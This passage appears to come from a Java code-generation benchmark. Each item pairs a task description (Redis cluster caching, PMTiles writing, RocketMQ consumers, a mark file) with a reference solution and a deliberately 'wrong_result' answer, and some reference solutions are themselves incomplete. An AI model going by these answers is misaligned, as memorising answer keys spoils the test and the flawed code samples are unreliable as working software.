    "Instruction": "Task Description: Create a Java class that implements Redis cluster operations using JedisCluster for caching management, including basic CRUD operations, hash operations, and batch operations.\n\nClass Description: JedisClusterCacheManager is a Redis cache manager implementation that uses JedisCluster to interact with a Redis cluster. It provides various Redis operations including setting/getting values, hash operations, batch operations, and deletion. The class handles serialization/deserialization of objects and manages Redis connections.\n\nAttributes:\n- redis: JedisClusterClient - The Redis client wrapper that implements IRedis interface\n- log: Logger - Logger instance for error logging\n- serializer: ISerializer<Object> - Serializer for converting objects to/from byte arrays (inherited from AbstractRedisCacheManager)\n\nMethods:\n- JedisClusterCacheManager(JedisCluster, ISerializer<Object>) -> void - Constructor that initializes the Redis client and serializer\n- getRedis() -> IRedis - Returns the Redis client instance\n- close() -> void - Closes the Redis connection (inherited from AbstractRedisCacheManager)\n- set(byte[], byte[]) -> void - Sets a key-value pair in Redis\n- setex(byte[], int, byte[]) -> void - Sets a key-value pair with expiration time\n- hset(byte[], byte[], byte[]) -> void - Sets a field in a Redis hash\n- hset(byte[], byte[], byte[], int) -> void - Sets a field in a Redis hash with expiration time for the key\n- mset(Collection<MSetParam>) -> void - Batch sets multiple key-value pairs\n- get(byte[]) -> byte[] - Gets a value by key\n- hget(byte[], byte[]) -> byte[] - Gets a field value from a Redis hash\n- mget(Type, Set<CacheKeyTO>) -> Map<CacheKeyTO, CacheWrapper<Object>> - Batch gets multiple values\n- delete(Set<CacheKeyTO>) -> void - Deletes multiple keys",
    "Canonical_solution": "import com.jarvis.cache.MSetParam;\nimport com.jarvis.cache.serializer.ISerializer;\nimport com.jarvis.cache.to.CacheKeyTO;\nimport com.jarvis.cache.to.CacheWrapper;\nimport redis.clients.jedis.JedisCluster;\nimport java.io.IOException;\nimport java.lang.reflect.Type;\nimport java.util.Collection;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class JedisClusterCacheManager extends AbstractRedisCacheManager {\n\n    private static final Logger log = LoggerFactory.getLogger(JedisClusterCacheManager.class);\n    \n    private final JedisClusterClient redis;\n\n    public JedisClusterCacheManager(JedisCluster jedisCluster, ISerializer<Object> serializer) {\n        super(serializer);\n        this.redis = new JedisClusterClient(jedisCluster, this);\n    }\n\n    @Override\n    protected IRedis getRedis() {\n        return redis;\n    }\n\n    public static class JedisClusterClient implements IRedis {\n\n        private final JedisCluster jedisCluster;\n        private final AbstractRedisCacheManager cacheManager;\n\n        public JedisClusterClient(JedisCluster jedisCluster, AbstractRedisCacheManager cacheManager) {\n            this.jedisCluster = jedisCluster;\n            this.cacheManager = cacheManager;\n        }\n\n        @Override\n        public void close() throws IOException {\n        }\n\n        @Override\n        public void set(byte[] key, byte[] value) {\n            jedisCluster.set(key, value);\n        }\n\n        @Override\n        public void setex(byte[] key, int seconds, byte[] value) {\n            jedisCluster.setex(key, seconds, value);\n        }\n\n        @Override\n        public void hset(byte[] key, byte[] field, byte[] value) {\n            jedisCluster.hset(key, field, value);\n        }\n\n        @Override\n        public void hset(byte[] key, byte[] field, byte[] value, int seconds) {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) {\n                    pipeline.hset(key, field, value);\n                    pipeline.expire(key, seconds);\n                }\n            };\n            try {\n                retryableJedisClusterPipeline.sync();\n            } catch (Exception e) {\n                log.error(e.getMessage(), e);\n            }\n        }\n\n        @Override\n        public void mset(Collection<MSetParam> params) {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) throws Exception {\n                    JedisUtil.executeMSet(pipeline, cacheManager, params);\n                }\n            };\n            try {\n                retryableJedisClusterPipeline.sync();\n            } catch (Exception e) {\n                log.error(e.getMessage(), e);\n            }\n        }\n\n        @Override\n        public byte[] get(byte[] key) {\n            return jedisCluster.get(key);\n        }\n\n        @Override\n        public byte[] hget(byte[] key, byte[] field) {\n            return jedisCluster.hget(key, field);\n        }\n\n        @Override\n        public Map<CacheKeyTO, CacheWrapper<Object>> mget(Type returnType, Set<CacheKeyTO> keys) throws Exception {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) {\n                    JedisUtil.executeMGet(pipeline, keys);\n                }\n            };\n            return cacheManager.deserialize(keys, retryableJedisClusterPipeline.syncAndReturnAll(), returnType);\n        }\n\n        @Override\n        public void delete(Set<CacheKeyTO> keys) {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) {\n                    JedisUtil.executeDelete(pipeline, keys);\n                }\n            };\n            try {\n                retryableJedisClusterPipeline.sync();\n            } catch (Exception e) {\n                log.error(e.getMessage(), e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport redis.clients.jedis.JedisCluster;\nimport redis.clients.jedis.params.SetParams;\nimport java.util.*;\n\npublic class JedisClusterCacheManager extends AbstractRedisCacheManager {\n    private final JedisCluster redis;\n    private final ISerializer<Object> serializer;\n\n    public JedisClusterCacheManager(JedisCluster jedisCluster, ISerializer<Object> serializer) {\n        this.redis = jedisCluster;\n        this.serializer = serializer;\n    }\n\n    public IRedis getRedis() {\n        return new IRedis() {\n            @Override\n            public void set(byte[] key, byte[] value) {\n                redis.set(key, value);\n            }\n\n            @Override\n            public void setex(byte[] key, int seconds, byte[] value) {\n                redis.setex(key, seconds, value);\n            }\n\n            @Override\n            public void hset(byte[] key, byte[] field, byte[] value) {\n                redis.hset(key, field, value);\n            }\n\n            @Override\n            public void hset(byte[] key, byte[] field, byte[] value, int seconds) {\n                redis.hset(key, field, value);\n                redis.expire(key, seconds);\n            }\n\n            @Override\n            public void mset(Collection<MSetParam> params) {\n                Map<byte[], byte[]> map = new HashMap<>();\n                for (MSetParam param : params) {\n                    map.put(param.getKey(), param.getValue());\n                }\n                redis.mset(map);\n            }\n\n            @Override\n            public byte[] get(byte[] key) {\n                return redis.get(key);\n            }\n\n            @Override\n            public byte[] hget(byte[] key, byte[] field) {\n                return redis.hget(key, field);\n            }\n\n            @Override\n            public <T> Map<CacheKeyTO, CacheWrapper<T>> mget(Class<T> type, Set<CacheKeyTO> keys) {\n                Map<CacheKeyTO, CacheWrapper<T>> result = new HashMap<>();\n                List<byte[]> rawKeys = new ArrayList<>();\n                for (CacheKeyTO key : keys) {\n                    rawKeys.add(serializer.serialize(key));\n                }\n                List<byte[]> rawValues = redis.mget(rawKeys.toArray(new byte[0][0]));\n                Iterator<byte[]> valueIterator = rawValues.iterator();\n                for (CacheKeyTO key : keys) {\n                    byte[] value = valueIterator.hasNext() ? valueIterator.next() : null;\n                    if (value != null) {\n                        result.put(key, new CacheWrapper<>(serializer.deserialize(value, type)));\n                    }\n                }\n                return result;\n            }\n\n            @Override\n            public void delete(Set<CacheKeyTO> keys) {\n                List<byte[]> rawKeys = new ArrayList<>();\n                for (CacheKeyTO key : keys) {\n                    rawKeys.add(serializer.serialize(key));\n                }\n                redis.del(rawKeys.toArray(new byte[0][0]));\n            }\n        };\n    }\n\n    @Override\n    public void close() {\n        redis.close();\n    }\n}\n```"
  },
  {
    "Task_id": 35,
    "Instruction": "Task Description: Create a Java class that implements a writable tile archive using Java NIO's FileChannel for efficient file operations, supporting both file-based and in-memory storage options.\n\nClass Description: WriteablePmtiles is a class that provides functionality to write and manage tile archive data using Java NIO channels. It supports writing to either a physical file or an in-memory buffer, tracks bytes written, and handles proper resource cleanup.\n\nAttributes:\n- out: [SeekableByteChannel] - The channel used for writing data (either FileChannel or in-memory channel)\n- bytesWritten: [LongSupplier] - A supplier that provides the number of bytes written to the channel\n\nMethods:\n- newWriteToFile(Path path) -> [WriteablePmtiles] - Static factory method that creates a new instance writing to a physical file at the specified path\n- newWriteToMemory(SeekableInMemoryByteChannel bytes) -> [WriteablePmtiles] - Static factory method that creates a new instance writing to an in-memory byte channel\n- finish(TileArchiveMetadata tileArchiveMetadata) -> [void] - Finalizes the archive by writing metadata and directory information\n- bytesWritten() -> [long] - Returns the number of bytes written to the archive\n- close() -> [void] - Closes the underlying channel and releases system resources\n- DeduplicatingTileWriter.write(TileEncodingResult encodingResult) -> [void] - Inner class method that writes tile data to the channel\n- DeduplicatingTileWriter.close() -> [void] - Inner class method that performs any necessary cleanup (none in this implementation)",
    "Canonical_solution": "import com.onthegomap.planetiler.util.FileUtils;\nimport com.onthegomap.planetiler.util.SeekableInMemoryByteChannel;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.function.LongSupplier;\n\npublic final class WriteablePmtiles implements WriteableTileArchive {\n\n  private final SeekableByteChannel out;\n  private final LongSupplier bytesWritten;\n\n  private WriteablePmtiles(SeekableByteChannel channel, LongSupplier bytesWritten) throws IOException {\n    this.out = channel;\n    out.write(ByteBuffer.allocate(INIT_SECTION));\n    this.bytesWritten = bytesWritten;\n  }\n\n  public static WriteablePmtiles newWriteToFile(Path path) throws IOException {\n    return new WriteablePmtiles(\n      FileChannel.open(path, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE),\n      () -> FileUtils.size(path)\n    );\n  }\n\n  public static WriteablePmtiles newWriteToMemory(SeekableInMemoryByteChannel bytes) throws IOException {\n    return new WriteablePmtiles(bytes, () -> 0);\n  }\n\n  @Override\n  public void finish(TileArchiveMetadata tileArchiveMetadata) {\n    try {\n      out.write(ByteBuffer.wrap(jsonBytes));\n      out.write(ByteBuffer.wrap(directories.leaves));\n      out.position(0);\n      out.write(ByteBuffer.wrap(header.toBytes()));\n      out.write(ByteBuffer.wrap(directories.root));\n    } catch (IOException e) {\n      LOGGER.error(e.getMessage());\n    }\n  }\n\n  @Override\n  public long bytesWritten() {\n    return bytesWritten.getAsLong();\n  }\n\n  @Override\n  public void close() throws IOException {\n    out.close();\n  }\n\n  private class DeduplicatingTileWriter implements TileWriter {\n    @Override\n    public void write(TileEncodingResult encodingResult) {\n      try {\n        out.write(ByteBuffer.wrap(data));\n      } catch (IOException e) {\n        throw new UncheckedIOException(e);\n      }\n      currentOffset += data.length;\n    }\n\n    @Override\n    public void close() {\n      // no cleanup needed.\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class WriteablePmtiles {\n    private final SeekableByteChannel out;\n    private final LongSupplier bytesWritten;\n\n    private WriteablePmtiles(SeekableByteChannel out, LongSupplier bytesWritten) {\n        this.out = out;\n        this.bytesWritten = bytesWritten;\n    }\n\n    public static WriteablePmtiles newWriteToFile(Path path) throws IOException {\n        FileChannel fileChannel = FileChannel.open(path, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);\n        return new WriteablePmtiles(fileChannel, () -> fileChannel.position());\n    }\n\n    public static WriteablePmtiles newWriteToMemory(SeekableInMemoryByteChannel bytes) {\n        return new WriteablePmtiles(bytes, bytes::position);\n    }\n\n    public void finish(TileArchiveMetadata tileArchiveMetadata) throws IOException {\n        long metadataPosition = bytesWritten.getAsLong();\n        byte[] metadataBytes = tileArchiveMetadata.serialize();\n        out.write(ByteBuffer.wrap(metadataBytes));\n        long directoryPosition = bytesWritten.getAsLong();\n        byte[] directoryBytes = tileArchiveMetadata.directory().serialize();\n        out.write(ByteBuffer.wrap(directoryBytes));\n        out.position(directoryPosition);\n    }\n\n    public long bytesWritten() {\n        return bytesWritten.getAsLong();\n    }\n\n    public void close() throws IOException {\n        out.close();\n    }\n\n    public class DeduplicatingTileWriter {\n        public void write(TileEncodingResult encodingResult) throws IOException {\n            ByteBuffer buffer = ByteBuffer.wrap(encodingResult.data());\n            out.write(buffer);\n        }\n\n        public void close() throws IOException {\n            // No cleanup needed\n        }\n    }\n}"
  },
  {
    "Task_id": 360,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ message consumer using the push model. The class should handle message consumption from a specified topic, with configurable NameServer address and consumer group settings.\n\nClass Description: The Consumer class is a RocketMQ message consumer implementation that subscribes to a topic and processes incoming messages asynchronously. It uses DefaultMQPushConsumer for push-based consumption and provides methods to start, shutdown, and configure the consumer.\n\nAttributes:\n- CONSUMER_GROUP: [String] - The consumer group name for this consumer instance\n- DEFAULT_NAMESRVADDR: [String] - Default NameServer address if none is provided\n- TOPIC: [String] - The topic to subscribe to for messages\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- Consumer() - [Constructor] -> [void] - Initializes the consumer with default settings, subscribes to the topic, and registers a message listener\n- start() -> [void] - Starts the consumer to begin receiving messages\n- shutdown() -> [void] - Shuts down the consumer gracefully\n- setNamesrvAddr(String namesrvAddr) -> [void] - Sets the NameServer address for the consumer",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\n\npublic class Consumer {\n\n    public static final String CONSUMER_GROUP = \"please_rename_unique_group_name_4\";\n    public static final String DEFAULT_NAMESRVADDR = \"127.0.0.1:9876\";\n    public static final String TOPIC = \"TopicTest\";\n\n    private DefaultMQPushConsumer consumer;\n\n    public Consumer() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.subscribe(TOPIC, \"*\");\n        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -> {\n            System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msg);\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        System.out.printf(\"Consumer Started.%n\");\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.protocol.heartbeat.ConsumerType;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class Consumer {\n    private static final String CONSUMER_GROUP = \"default_consumer_group\";\n    private static final String DEFAULT_NAMESRVADDR = \"localhost:9876\";\n    private static final String TOPIC = \"default_topic\";\n    private DefaultMQPushConsumer consumer;\n\n    public Consumer() throws Exception {\n        this.consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        this.consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);\n        this.consumer.subscribe(TOPIC, \"*\");\n        this.consumer.setMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                System.out.println(\"Received message: \" + new String(msg.getBody()));\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void start() throws Exception {\n        this.consumer.start();\n    }\n\n    public void shutdown() {\n        this.consumer.shutdown();\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        this.consumer.setNamesrvAddr(namesrvAddr);\n    }\n}\n```"
  },
  {
    "Task_id": 363,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to monitor and handle offset moved events in a message queue system.\n\nClass Description: The RocketMQConsumer class is designed to consume messages from a RocketMQ broker, specifically monitoring for offset moved events. It uses a push-based consumption model with a single-threaded listener to process messages. The class handles message subscription, listener configuration, and consumer lifecycle management.\n\nAttributes:\n- defaultMQPushConsumer: DefaultMQPushConsumer - The main consumer instance that connects to RocketMQ and handles message consumption\n- monitorListener: MonitorListener - (Assumed from context) Listener interface for reporting delete message events\n\nMethods:\n- RocketMQConsumer(RPCHook, String) -> void - Constructor that initializes the consumer with RPC hook and NameServer address\n- generateInstanceName(String) -> String - Generates a unique instance name for the consumer\n- configureMessageListener() -> void - Configures the message listener to handle incoming messages\n- subscribeToTopic() -> void - Subscribes to the offset moved event topic\n- start() -> void - Starts the consumer to begin message consumption\n- shutdown() -> void - Shuts down the consumer gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.topic.TopicValidator;\nimport org.apache.rocketmq.remoting.RPCHook;\n\npublic class RocketMQConsumer {\n\n    private final DefaultMQPushConsumer defaultMQPushConsumer;\n\n    public RocketMQConsumer(RPCHook rpcHook, String namesrvAddr) throws MQClientException {\n        this.defaultMQPushConsumer = new DefaultMQPushConsumer(MixAll.MONITOR_CONSUMER_GROUP, rpcHook);\n        this.defaultMQPushConsumer.setNamesrvAddr(namesrvAddr);\n        this.defaultMQPushConsumer.setInstanceName(generateInstanceName(namesrvAddr));\n        this.defaultMQPushConsumer.setConsumeThreadMin(1);\n        this.defaultMQPushConsumer.setConsumeThreadMax(1);\n        \n        configureMessageListener();\n        subscribeToTopic();\n    }\n\n    private String generateInstanceName(String namesrvAddr) {\n        return \"MonitorService_\" + (System.currentTimeMillis() + RandomUtils.nextInt(0, Integer.MAX_VALUE) + namesrvAddr).hashCode();\n    }\n\n    private void configureMessageListener() {\n        this.defaultMQPushConsumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                ConsumeConcurrentlyContext context) {\n                try {\n                    OffsetMovedEvent ome =\n                        OffsetMovedEvent.decode(msgs.get(0).getBody(), OffsetMovedEvent.class);\n\n                    DeleteMsgsEvent deleteMsgsEvent = new DeleteMsgsEvent();\n                    deleteMsgsEvent.setOffsetMovedEvent(ome);\n                    deleteMsgsEvent.setEventTimestamp(msgs.get(0).getStoreTimestamp());\n\n                    MonitorService.this.monitorListener.reportDeleteMsgsEvent(deleteMsgsEvent);\n                } catch (Exception e) {\n                }\n\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n    }\n\n    private void subscribeToTopic() throws MQClientException {\n        this.defaultMQPushConsumer.subscribe(TopicValidator.RMQ_SYS_OFFSET_MOVED_EVENT, \"*\");\n    }\n\n    public void start() throws MQClientException {\n        this.defaultMQPushConsumer.start();\n    }\n\n    public void shutdown() {\n        this.defaultMQPushConsumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\n\npublic class RocketMQConsumer {\n    private DefaultMQPushConsumer defaultMQPushConsumer;\n    private MonitorListener monitorListener;\n\n    public RocketMQConsumer(RPCHook rpcHook, String nameServerAddress) throws Exception {\n        this.defaultMQPushConsumer = new DefaultMQPushConsumer(generateInstanceName(\"RocketMQConsumer\"));\n        this.defaultMQPushConsumer.setNamesrvAddr(nameServerAddress);\n        this.defaultMQPushConsumer.setRPCHook(rpcHook);\n        configureMessageListener();\n        subscribeToTopic();\n    }\n\n    private String generateInstanceName(String baseName) {\n        return baseName + \"-\" + System.currentTimeMillis() + \"-\" + Thread.currentThread().getId();\n    }\n\n    private void configureMessageListener() {\n        this.defaultMQPushConsumer.setMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            for (MessageExt msg : msgs) {\n                if (\"OFFSET_MOVED_EVENT\".equals(msg.getTopic())) {\n                    monitorListener.onOffsetMoved(msg);\n                }\n            }\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    private void subscribeToTopic() {\n        this.defaultMQPushConsumer.subscribe(\"OFFSET_MOVED_TOPIC\", \"*\");\n    }\n\n    public void start() throws Exception {\n        this.defaultMQPushConsumer.start();\n    }\n\n    public void shutdown() {\n        this.defaultMQPushConsumer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 367,
    "Instruction": "Task Description: Create a Java class that configures and initializes a RocketMQ push consumer with specific settings for message consumption, including topic subscription and message listener registration.\n\nClass Description: The `AliyunMqConfiguration` class is a Spring configuration class responsible for setting up a RocketMQ push consumer. It configures the consumer with NameServer address, consumption strategy, topic subscriptions, and message listeners. The consumer is started asynchronously after a short delay to ensure proper initialization.\n\nAttributes:\n- `uacPushMessageListener`: [UacPushMessageListener] - The message listener implementation that handles incoming messages\n- `paascloudProperties`: [PaascloudProperties] - Configuration properties containing RocketMQ settings\n- `taskExecutor`: [TaskExecutor] - Executor service for asynchronous consumer startup\n\nMethods:\n- `defaultMQPushConsumer()`: [None] -> [DefaultMQPushConsumer] - Configures and initializes the RocketMQ push consumer with the following steps:\n  1. Creates a new DefaultMQPushConsumer instance with the consumer group from properties\n  2. Sets the NameServer address from properties\n  3. Configures consumption to start from the last offset\n  4. Parses and subscribes to topics and tags from constants\n  5. Registers the message listener\n  6. Sets thread pool size for message consumption\n  7. Starts the consumer asynchronously after a 5-second delay\n  8. Returns the configured consumer instance",
    "Canonical_solution": "import com.paascloud.PublicUtil;\nimport com.paascloud.base.constant.AliyunMqTopicConstants;\nimport com.paascloud.base.constant.GlobalConstant;\nimport com.paascloud.config.properties.PaascloudProperties;\nimport com.paascloud.provider.mq.consumer.listener.UacPushMessageListener;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.springframework.core.task.TaskExecutor;\n\n@Configuration\npublic class AliyunMqConfiguration {\n    @Resource\n    private UacPushMessageListener uacPushMessageListener;\n\n    @Resource\n    private PaascloudProperties paascloudProperties;\n\n    @Resource\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() throws MQClientException {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getAliyun().getRocketMq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getAliyun().getRocketMq().getNamesrvAddr());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n\n        String[] strArray = AliyunMqTopicConstants.ConsumerTopics.UAC.split(GlobalConstant.Symbol.COMMA);\n        for (String aStrArray : strArray) {\n            String[] topicArray = aStrArray.split(GlobalConstant.Symbol.AT);\n            String topic = topicArray[0];\n            String tags = topicArray[1];\n            if (PublicUtil.isEmpty(tags)) {\n                tags = \"*\";\n            }\n            consumer.subscribe(topic, tags);\n        }\n\n        consumer.registerMessageListener(uacPushMessageListener);\n        consumer.setConsumeThreadMax(2);\n        consumer.setConsumeThreadMin(2);\n\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException | MQClientException e) {\n                log.error(\"RocketMq OpcPushConsumer, Exception={}\", e.getMessage(), e);\n            }\n        });\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "```java\n@Configuration\npublic class AliyunMqConfiguration {\n\n    @Autowired\n    private UacPushMessageListener uacPushMessageListener;\n\n    @Autowired\n    private PaascloudProperties paascloudProperties;\n\n    @Autowired\n    private TaskExecutor taskExecutor;\n\n    @Bean\n    public DefaultMQPushConsumer defaultMQPushConsumer() {\n        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(paascloudProperties.getRocketmq().getConsumerGroup());\n        consumer.setNamesrvAddr(paascloudProperties.getRocketmq().getNameServerAddress());\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_LAST_OFFSET);\n        consumer.subscribe(RocketmqConstants.TOPIC, RocketmqConstants.TAG);\n        consumer.registerMessageListener(uacPushMessageListener);\n        consumer.setThreadPoolSize(paascloudProperties.getRocketmq().getThreadPoolSize());\n        taskExecutor.execute(() -> {\n            try {\n                Thread.sleep(5000);\n                consumer.start();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        });\n        return consumer;\n    }\n}\n```"
  },
  {
    "Task_id": 37,
    "Instruction": "Task Description: Create a Java class that manages a mark file for inter-process communication, allowing processes to check the status of another process through a shared memory-mapped file. The class should handle file creation, version checking, timestamp validation, and resource cleanup.\n\nClass Description: The MarkFile class provides a mechanism for processes to communicate their liveness status via a memory-mapped file. It supports checking version compatibility, monitoring heartbeat timestamps, and ensuring proper resource cleanup. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- markFile: File - The physical file used for marking process status\n- mappedBuffer: MappedByteBuffer - The memory-mapped buffer for file operations\n- buffer: UnsafeBuffer - Wrapper around mappedBuffer for atomic operations\n- isClosed: AtomicBoolean - Flag indicating whether resources have been released\n\nMethods:\n- MarkFile(File, boolean, int, int, int, long, EpochClock, IntConsumer, Consumer<String>) -> void - Constructor that initializes the mark file with version and timestamp fields\n- close() -> void - Releases resources and closes the file channel\n- mapNewOrExistingMarkFile(File, boolean, int, int, long, long, EpochClock, IntConsumer, Consumer<String>) -> MappedByteBuffer - Static method that maps the file into memory and performs version/timestamp validation\n- ensureMarkFileLink(File, File, String) -> void - Static method that manages symbolic links to the mark file directory",
    "Canonical_solution": "import org.agrona.concurrent.UnsafeBuffer;\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.function.Consumer;\nimport java.util.function.IntConsumer;\nimport static java.nio.channels.FileChannel.MapMode.READ_WRITE;\nimport static java.nio.file.StandardOpenOption.CREATE;\nimport static java.nio.file.StandardOpenOption.READ;\nimport static java.nio.file.StandardOpenOption.WRITE;\n\npublic class MarkFile implements AutoCloseable\n{\n    private final File markFile;\n    private final MappedByteBuffer mappedBuffer;\n    private final UnsafeBuffer buffer;\n    private final AtomicBoolean isClosed = new AtomicBoolean();\n\n    public MarkFile(\n        final File markFile,\n        final boolean shouldPreExist,\n        final int versionFieldOffset,\n        final int timestampFieldOffset,\n        final int totalFileLength,\n        final long timeoutMs,\n        final EpochClock epochClock,\n        final IntConsumer versionCheck,\n        final Consumer<String> logger)\n    {\n        this.markFile = markFile;\n        this.mappedBuffer = mapNewOrExistingMarkFile(\n            markFile,\n            shouldPreExist,\n            versionFieldOffset,\n            timestampFieldOffset,\n            totalFileLength,\n            timeoutMs,\n            epochClock,\n            versionCheck,\n            logger);\n        this.buffer = new UnsafeBuffer(mappedBuffer);\n    }\n\n    public void close()\n    {\n        if (isClosed.compareAndSet(false, true))\n        {\n            BufferUtil.free(mappedBuffer);\n        }\n    }\n\n    public static MappedByteBuffer mapNewOrExistingMarkFile(\n        final File markFile,\n        final boolean shouldPreExist,\n        final int versionFieldOffset,\n        final int timestampFieldOffset,\n        final long totalFileLength,\n        final long timeoutMs,\n        final EpochClock epochClock,\n        final IntConsumer versionCheck,\n        final Consumer<String> logger)\n    {\n        MappedByteBuffer byteBuffer = null;\n\n        try (FileChannel channel = FileChannel.open(markFile.toPath(), CREATE, READ, WRITE))\n        {\n            byteBuffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, totalFileLength);\n            final UnsafeBuffer buffer = new UnsafeBuffer(byteBuffer);\n\n            if (shouldPreExist)\n            {\n                if (buffer.capacity() < (timestampFieldOffset + SIZE_OF_LONG))\n                {\n                    throw new IllegalStateException(\"active MarkFile too short capacity=\" + buffer.capacity() +\n                        \" < \" + (timestampFieldOffset + SIZE_OF_LONG));\n                }\n\n                final int version = buffer.getIntVolatile(versionFieldOffset);\n\n                if (null != logger)\n                {\n                    logger.accept(\"INFO: Mark file exists: \" + markFile);\n                }\n\n                versionCheck.accept(version);\n\n                final long timestampMs = buffer.getLongVolatile(timestampFieldOffset);\n                final long timestampAgeMs = epochClock.time() - timestampMs;\n\n                if (null != logger)\n                {\n                    logger.accept(\"INFO: heartbeat timestampMs=\" + timestampMs + \" ageMs=\" + timestampAgeMs);\n                }\n\n                if (timestampAgeMs < timeoutMs)\n                {\n                    throw new IllegalStateException(\"active Mark file detected\");\n                }\n            }\n        }\n        catch (final Exception ex)\n        {\n            if (null != byteBuffer)\n            {\n                BufferUtil.free(byteBuffer);\n            }\n\n            throw new RuntimeException(ex);\n        }\n\n        return byteBuffer;\n    }\n\n    public static void ensureMarkFileLink(final File serviceDir, final File actualFile, final String linkFilename)\n    {\n        final Path linkFile = new File(serviceDir, linkFilename).toPath();\n        if (serviceDir.equals(actualFile.getParentFile()))\n        {\n            try\n            {\n                Files.deleteIfExists(linkFile);\n            }\n            catch (final IOException ex)\n            {\n                throw new RuntimeException(\"failed to remove old link file\", ex);\n            }\n        }\n        else\n        {\n            try\n            {\n                Files.write(\n                    linkFile,\n                    actualFile.getParent().getBytes(US_ASCII),\n                    